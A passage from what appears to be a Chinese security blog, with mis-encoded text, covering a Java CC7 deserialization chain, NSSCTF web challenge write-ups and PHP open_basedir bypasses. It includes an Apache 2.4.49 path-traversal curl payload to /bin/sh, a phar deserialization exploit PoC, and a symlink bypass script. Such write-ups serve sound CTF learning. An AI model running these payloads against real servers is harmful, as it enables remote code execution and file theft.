<h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>CC7çš„é“¾å­ç‰¹ç‚¹åœ¨äºå®šä¹‰äº†ä¸¤ä¸ª<code>LazyMap</code> ï¼Œå¹¶æ”¾åˆ°<code>Hashtable</code> ä¸­å»ï¼Œè€Œ<code>Hashtable</code> é¡¾åæ€ä¹‰ä¹Ÿå°±æ˜¯å“ˆå¸Œè¡¨ï¼Œ</p>
<p>è¿™ä¸ªé“¾å­æ˜¾è€Œæ˜“è§ä¹Ÿæ˜¯åƒé€šè¿‡è°ƒç”¨åˆ°<code>LazyMap#get</code> æˆ–è€…<code>LazyMap#getValue</code> æ¥å®ç°RCEï¼Œé‚£ä¹ˆé‡ç‚¹å°±æ˜¯ä»å“ªé‡Œå¼€å§‹è°ƒç”¨äº†ï¼Œè¿™é‡Œå¥—åœ¨æœ€å¤–é¢çš„ç±»ä¸º<code>Hashtable</code> ï¼Œé‚£å°±ç›´æ¥å»çœ‹<code>Hashtable#readObject</code></p>
<p>ä¼šéå†<code>Hashtable</code> é‡Œé¢çš„é”®å€¼å¯¹</p>
<p><img src="https://img-blog.csdnimg.cn/be18ff732469477c8174b92f1f96fc47.png" alt="Untitled"></p>
<p>è·Ÿè¿›åˆ°<code>reconstitutionPut</code> ï¼Œè¿™é‡Œä¼šå°†éå†åˆ°çš„é”®å€¼å¯¹éƒ½æ”¾åˆ°<code>tab</code>é‡Œé¢ï¼Œå¹¶ä¸”è¦ä¿è¯æ”¾å…¥çš„æ•°æ®<code>hashCode</code>ä¸èƒ½ç›¸ç­‰å³ä¸èƒ½äº§ç”Ÿå“ˆå¸Œç¢°æ’ï¼Œè€Œå¦‚æœ<code>hashCode</code>ç›¸ç­‰å°±ä¼šè°ƒç”¨åˆ°<code>LazyMap#equals</code></p>
<p><img src="https://img-blog.csdnimg.cn/e4f6cd039ca146b2882774bc3c3e39b0.png" alt="Untitled"></p>
<p>è·Ÿè¿›åˆ°<code>LazyMap#equals</code> ï¼Œä½†LazyMapå¹¶æ²¡æœ‰é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œé‚£å°±æ˜¯ä»–çˆ¶ç±»<code>AbstractMapDecorator#equals</code></p>
<p>è¿™é‡Œå†æ¬¡è°ƒç”¨åˆ°äº†æŸç±»çš„equalsï¼Œè€Œé“¾å­é‡Œåœ¨å®ç°LazyMapçš„æ—¶å€™ä¼šå…ˆå†™ä¸€ä¸ªinnerMapï¼ˆHashMapï¼‰ï¼Œè€Œ<code>LazyMap#decorate</code> æ–¹æ³•ä¹Ÿå°±ç›¸å½“äºæ„é€ æ–¹æ³•ï¼Œå°†innerMapç»™äº†çˆ¶ç±»ï¼Œæ‰€æœ‰è¿™é‡Œçš„<code>this.map</code> ä¹Ÿå°±æ˜¯<code>HashMap</code>äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> object == <span class="keyword">this</span> ? <span class="keyword">true</span> : <span class="keyword">this</span>.map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯HashMapä¹Ÿæ²¡æœ‰é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œç…§ä¾‹å»å…¶çˆ¶ç±»æ‰¾<code>AbstractMap#equals</code></p>
<p>æˆåŠŸè°ƒç”¨åˆ°äº†<code>LazyMap#get</code> ï¼Œåé¢çš„å°±ä¸ç»§ç»­åˆ†æäº†</p>
<p><img src="https://img-blog.csdnimg.cn/f9d53566d19246eaaaec753f9c45eb39.png" alt="Untitled"></p>
<p>æ‰€æœ‰ç†æ‰€å½“ç„¶çš„ï¼Œè¦å®ç°è¿™ä¸ªé“¾å­ï¼Œå°±éœ€è¦å¼ºåˆ¶è°ƒç”¨åˆ°<code>AbstractMapDecorator#equals</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼ å…¥HashTableå¿…é¡»è¦äº§ç”Ÿå“ˆå¸Œç¢°æ’ï¼Œè€Œè¿™ä¸ªç‚¹åœ¨ä¹‹å‰è“å¸½æ¯çš„æ—¶å€™ä¹Ÿç¢°åˆ°äº†ï¼Œè¿™é‡Œå°±ä¸æ˜ç¡®è¯´äº†</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/at52wg">https://www.yuque.com/jinjinshigekeaigui/qskpi5/at52wg</a></p>
<p><a href="https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java">https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java</a></p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Round#4 Team Web</title>
    <url>/2022/08/03/NSSCTF-Round-4-Team-Web/</url>
    <content><![CDATA[<h2 id="1zweb"><a href="#1zweb" class="headerlink" title="1zweb"></a>1zweb</h2><p>éé¢„æœŸï¼Œç›´æ¥è¯»flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/flag</span><br></pre></td></tr></table></figure>

<h2 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h2><p>ç»å…¸Apache2.4.49 è·¯å¾„ç©¿è¶Šæ¼æ´</p>
<p>ç›´æ¥ä¸Špayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X  POST -d &quot;echo;ls /flag_is_here;grep -r &quot;NSS&quot; /flag_is_here&quot; &lt;http://1.116.210.145:28122/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1zweb-revenge"><a href="#1zweb-revenge" class="headerlink" title="1zweb(revenge)"></a>1zweb(revenge)</h2><ul>
<li>ç»å…¸phar+gzip+phpå¼•ç”¨ç»•è¿‡__wakeup</li>
</ul>
<p>ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–æºç ï¼š<code>index.php | upload.php</code></p>
<p><code>index.php</code> ï¼Œå­˜åœ¨ä¸€ä¸ªç±»å¯ä»¥è¿›è¡ŒRCEï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡è¿™é‡ŒæŠŠflagè¿‡æ»¤äº†ï¼Œä½†æ˜¯æ—¢ç„¶å­˜åœ¨å¯¹æ–‡ä»¶çš„æ“ä½œï¼Œè‡ªç„¶è€Œç„¶å°±æ˜¯pharåè®®è¿›è¡Œååºåˆ—åŒ–å’¯</p>
<p>ä½†æ˜¯æ³¨æ„è¿™é‡Œçš„ç±»å­˜åœ¨<code>__wakeup</code> ï¼Œè™½ç„¶è¯¥ç¯å¢ƒçš„phpç‰ˆæœ¬ç¬¦åˆæŸä¸ªcveï¼Œä½†æ˜¯pharæ–‡ä»¶å†…å®¹ä¸å¯ä»¥éšä¾¿æ›´æ”¹ï¼Œæ‰€æœ‰å°±ä¸èƒ½åˆ©ç”¨äº†ï¼Œæ‰€ä»¥è¦ç”¨phpå¼•ç”¨ç»•è¿‡ã€‚åœ¨wakeupä¸­å¯ä»¥å‘ç°æˆ‘ä»¬éœ€è¦çš„å€¼è¿›è¡Œäº†äº’æ¢ï¼Œé‚£ä¹ˆå¦‚æœ<code>LoveNss2</code>çš„<code>ljt</code>å¼•ç”¨<code>LoveNss1</code>çš„<code>dky</code> ï¼Œè€Œåœ¨<code>LoveNss1</code> çš„<code>__wakeup</code>æœ€åæ‰ä¼šæ‰§è¡Œå®ç°äº†<code>LoveNss2-&gt;ljt = Misc</code> ï¼Œå®ç°<code>LoveNss2#destruct</code> ä¸­çš„rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨<code>upload.php</code> ä¸­åšäº†ä¸€äº›è¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åç¼€åè¿›è¡Œäº†ç™½åå•ï¼Œä¸è¿‡pharå¹¶ä¸ä»‹æ„è¿™ä¸ªã€‚ä½†æ˜¯åœ¨åé¢ä¼šæ ¹æ®åˆ¤æ–­æ–‡ä»¶å†…å®¹ä¸­æ˜¯å¦å­˜åœ¨<code>__HALT_COMPILER();</code> ï¼Œç›´æ¥ä¸èƒ½ç›´æ¥åˆ©ç”¨pharæ–‡ä»¶æ”¹åç¼€åç»•è¿‡äº†ï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨gzipç»•è¿‡ï¼Œpharä¹Ÿæ˜¯å¯ä»¥è§£æçš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ å¼‚å¸¸&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(gettype(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltjä¸€çœ¼å°±å‘ç°äº†phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; æ–‡ä»¶å·²ç»å­˜åœ¨&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = fopen(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                fclose(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dkyä¸å–œæ¬¢è¿™ä¸ªæ–‡ä»¶ .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;)</span></span><br><span class="line">        <span class="comment">//     eval($this-&gt;cmd);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;ljt=&quot;Re&quot;;</span></span><br><span class="line">        <span class="comment">// $this-&gt;dky=&quot;Misc&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;ljt = &amp;<span class="variable">$a</span>-&gt;dky;</span><br><span class="line"><span class="variable">$b</span>-&gt;dky = &amp;<span class="variable">$a</span>-&gt;ljt;</span><br><span class="line"><span class="variable">$b</span>-&gt;cmd = <span class="string">&#x27;system(\\&#x27;</span>ls /;cat /f*\\<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;b652ce9b-4837-49aa-871d-0c5b33eea4d1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h4><p>å‰é¢è¯´<code>ä½†æ˜¯pharæ–‡ä»¶å†…å®¹ä¸å¯ä»¥éšä¾¿æ›´æ”¹ï¼Œæ‰€æœ‰å°±ä¸èƒ½åˆ©ç”¨äº†</code>ï¼Œä¸¥æ ¼æ¥è¯´æ˜¯é”™è¯¯çš„ï¼Œpharæ–‡ä»¶å†…å®¹å¯ä»¥ä¿®æ”¹ï¼Œä½†æ˜¯è¦é‡æ–°å†™å…¥ç­¾å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./phar1.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># æ•°æ® + ç­¾å + ç±»å‹ + GBMB</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;phar2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># å†™å…¥æ–°æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>NSSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>open_basedir bypass</title>
    <url>/2022/06/21/open-basedir-bypass/</url>
    <content><![CDATA[<blockquote>
<p>æ¯å¤©éƒ½åœ¨å†™ï¼Œä½†æ˜¯è¿˜æ²¡ä¸€ä¸ªå¯ä»¥ä¸Šä¼ çš„ã€‚ä¸èƒ½è®©åšå®¢é•¿è‰ï¼ˆ</p>
<p>å°±æŠŠä¹‹å‰ç¨ç¨æ•´ç†äº†ä¸€ä¸‹çš„å°å°çŸ¥è¯†ç‚¹ä¼ ä¸€ä¸‹ï¼Œå°±å½“ä½œæ˜¯å¤‡ä»½äº†ï¼Œå®³æ€•å“ªå¤©ç”µè„‘ç‚¸äº†~</p>
<p>ï¼ˆçœŸçš„æ•´ç†å¾—å¾ˆç®€å•ï¼Œå°±è·Ÿç€ç½‘ä¸Šçš„æ•´ç†è‡ªå·±è¿‡äº†ä¸€éï¼Œå¸ˆå‚…ä»¬çœ‹ä¸ªä¹å°±å¥½</p>
</blockquote>
<span id="more"></span>

<h2 id="open-basedirè®¤è¯†åŠç»•è¿‡"><a href="#open-basedirè®¤è¯†åŠç»•è¿‡" class="headerlink" title="open_basedirè®¤è¯†åŠç»•è¿‡"></a>open_basedirè®¤è¯†åŠç»•è¿‡</h2><h5 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h5><p><code>open_basedir</code>å‡½æ•°æ˜¯phpä¸­ç”¨äºé™åˆ¶è®¿é—®ç›®å½•çš„å‡½æ•°<br>1.å¯ä»¥åœ¨<code>php.ini</code>ä¸­è®¾ç½®<br>2.å¯ä»¥ç”¨<code>ini_set</code>è®¾ç½®<br>3.åœ¨apacheçš„httpd.confä¸­çš„Directoryé…ç½®<br>4.httpd.confä¸­çš„VritualHost<br>5.nginx fastcgi.conf</p>
<hr>
<p>æµ‹è¯•è¿‡ç¨‹ï¼š<br>ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸Šè¿›è¡Œä»¥ä¸‹å‘½ä»¤æ²¡æœ‰å®ç°ï¼Œä½†æ˜¯å¯ä»¥å†™åœ¨phpæ–‡ä»¶ä¸­å†æ‰§è¡Œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;ini_set(&quot;open_basedir&quot;,&quot;/var/www/html/&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>phpæ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> ini_get(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210719203742866.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹‹ååœ¨htmlç›®å½•ä¸‹å†™ä¸€ä¸ªphpæ–‡ä»¶å°è¯•è®¿é—®æ ¹ç›®å½•ä¸‹çš„flagï¼Œä½†æ˜¯æŠ¥é”™äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå®ç°äº†<code>open_basedir</code>çš„ç®€å•åˆ©ç”¨</p>
<h5 id="bypassæ–¹æ³•"><a href="#bypassæ–¹æ³•" class="headerlink" title="bypassæ–¹æ³•"></a>bypassæ–¹æ³•</h5><p><a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#0x03-%E5%88%A9%E7%94%A8symlink-%E5%87%BD%E6%95%B0Bypass">æµ…è°ˆå‡ ç§Bypass open_basedirçš„æ–¹æ³•</a></p>
<h6 id="0x01-å‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡"><a href="#0x01-å‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡" class="headerlink" title="0x01:å‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡"></a><strong>0x01:å‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡</strong></h6><p><code>open_basedir</code>å‡½æ•°å¯¹å‘½ä»¤æ‰§è¡Œå‡½æ•°æ²¡æœ‰é™åˆ¶ï¼Œæ¯”å¦‚systemï¼Œæ‰€ä»¥å¯ä»¥åœ¨phpæ–‡ä»¶ä¸­ä¿®æ”¹ä»£ç å°±å¯ä»¥ç›´æ¥å¾—åˆ°flagäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h6 id="0x02-symlinkå‡½æ•°ç»•è¿‡"><a href="#0x02-symlinkå‡½æ•°ç»•è¿‡" class="headerlink" title="0x02:symlinkå‡½æ•°ç»•è¿‡"></a><strong>0x02:symlinkå‡½æ•°ç»•è¿‡</strong></h6><p>åˆ©ç”¨symlinkå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/img_convert/ce5782d27b5b14fd43dab661790caa25.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//åœ¨å½“å‰åˆ›å»ºä¸€ç³»åˆ—çš„å­ç›®å½•</span></span><br><span class="line">    mkdir(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//åˆ‡æ¢å½“å‰ç›®å½•</span></span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//å»ºç«‹é“¾æ¥ a&gt;&gt;A/B/C/D</span></span><br><span class="line">    symlink(<span class="string">&#x27;A/B/C/D&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å»ºç«‹è¿æ¥ exp&gt;&gt;A/B/C/D/../../../../flag</span></span><br><span class="line">    symlink(<span class="string">&#x27;a/../../../../flag&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>);</span><br><span class="line">    unlink(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    mkdir(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥expæ˜¯æŒ‡å‘äº†å½“å‰ç›®å½•ä¸‹<code>a/../../../../flag</code>ï¼Œä½†æ˜¯åæ¥åˆ é™¤äº†aï¼Œæ‰€ä»¥å‰é¢çš„expå®é™…æŒ‡å‘çš„æ˜¯<code>/../../../../flag</code>å³å‘ä¸Šè·¨è¶Šç›®å½•è®¿é—®æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶</p>
<blockquote>
<p>tip:å­ç›®å½•çš„æ•°é‡ä»¥åŠ<code>..</code>çš„æ•°é‡è¦æ ¹æ®æˆ‘ä»¬è¦è®¿é—®çš„æ–‡ä»¶åœ¨å“ªï¼Œè¦è·¨è¶Šå¤šå°‘ä¸ªç›®å½•ï¼Œæ³¨æ„è¦ç®—ä¸Šå½“å‰çš„ç›®å½•</p>
</blockquote>
<h6 id="0x03-glob-ä¼ªåè®®ç»•è¿‡"><a href="#0x03-glob-ä¼ªåè®®ç»•è¿‡" class="headerlink" title="0x03:glob://ä¼ªåè®®ç»•è¿‡"></a><strong>0x03:glob://ä¼ªåè®®ç»•è¿‡</strong></h6><p>1.ç»“åˆDirectoryIterator<br>ï¼ˆåªå¯ä»¥è®¿é—®æ ¹ç›®å½•ä»¥åŠopen_basediré™åˆ¶çš„ç›®å½•ï¼‰<br>(è¿˜æ˜¯çœ‹phpæ‰‹å†Œè‡ªå·±å°è¯•)<br><a href="https://blog.csdn.net/weixin_33860553/article/details/88987194">DirectoryIteratoréå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</a><br>å¯ä»¥è·å–æ–‡ä»¶å<br><code>__toString</code><br><img src="https://img-blog.csdnimg.cn/img_convert/eb3c9c85c3d26d0f8cedba603e1a6207.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
